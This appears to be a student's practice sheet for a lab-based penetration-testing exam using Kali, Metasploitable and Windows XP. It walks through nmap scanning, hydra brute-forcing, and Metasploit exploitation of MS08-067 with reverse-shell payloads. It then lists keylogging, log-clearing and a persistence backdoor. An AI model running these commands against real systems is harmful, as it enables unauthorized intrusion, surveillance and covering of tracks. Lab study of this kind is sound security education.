# Practical Exam 1 Practice

## Question 1

To setup network on Linux:

```bash
ip a a <IP>/<Prefix> dev <NetworkInterface>
```

if using msfadmin on Metasploitable, use sudo to run with privilege.

To setup network on Windows 7 and higher:

* Go to Network and Sharing Center, click on the connection.
* Then select Properties.
* Then highlight the "Internet Protocol..." with IPv4, select Properties.
* Assign IP accordingly.

For Windows XP:

* Go to Control Panel.
* Select Network Connection.
* Double-click the network.
* Select Properties.
* Then highlight "Internet Protocol [TCP/IP]", select Properties.
* Assign IP accordingly.

As this task will be done for you during the test, use 

```bash
ip a
# OR
ifconfig
``` 

on Kali to check Kali's IP, or Linux distros like Metasploitable2.

## Question 2

To find live hosts on current network, use nmap:

```bash
nmap -sn <NetworkAddress/Prefix>
```

For port scanning:

```bash
nmap <HostAddress>
```

For OS information:

```bash
nmap -O -v <HostAddress>
```

To turn off the firewall on Windows:

* Search "Windows Firewall" and select the option with exactly these 2 words.
* Click "Turn Windows Firewall on or off" on side menu.
* Turn off the firewall.

## Question 3

To brute-force a password of an account with a service protocol on a specific host, use hydra:

```bash
hydra -l <LoginUsername> -P <PathToPasswordDictionary> <HostIPAddress> <ServiceProtocol> -t <ParallelAttempts>
```

## Question 4

Windows XP can be exploited with VNC injection, giving GUI view or control, or Meterpreter, a CLI tool to perform malicious actions on target host.

For VNC injection, while in Metasploitable Framework prompt:

```bash
use exploit/windows/smb/ms08_067_netapi
set payload windows/vncinject/reverse_tcp
set lhost <KaliIPAddress>
set rhost <XPIPAddress>
set viewonly false
exploit
```

For Meterpreter:

```bash
use exploit/windows/smb/ms08_067_netapi
set payload windows/meterpreter/reverse_tcp
set lhost <KaliIPAddress>
set rhost <XPIPAddress>
exploit
```

During Meterpreter session, commands that could be useful:

```bash
cd
ls
pwd
sysinfo # System information
ipconfig # Network information
screenshot
getpid # Get current process ID
ps
migrate <processID> # Migrate to process ID
search -f <filename> # Search file based on name
dowload <RemotePath> <LocalPath> # Remote download file from target host to local
keyscan_start # Start key logging, only works with good process privilege.
keyscan_dump # Dump key logging, only works with good process privilege.
keyscan_stop # Stop key logging, only works with good process privilege.
clearev # Clean event logs
```

To add backdoor on the Meterpreter session, background the session, then in MSF:

```bash
use exploit/windows/local/persistence
set lhost <KaliIPAddress>
set lport 445
set startup SYSTEM # DO NOT lowercase SYSTEM, as it is parameter value
sessions -l # Get the meterpreter session's ID
set session <MeterpreterSessionID> 
exploit
```

Then, use multi/handler to listen the incoming connection:

```bash
use multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost <KaliIPAddress>
set lport 445
run
```

After rebooting, XP will send back the connection and Kali will enter Meterpreter prompt automatically.
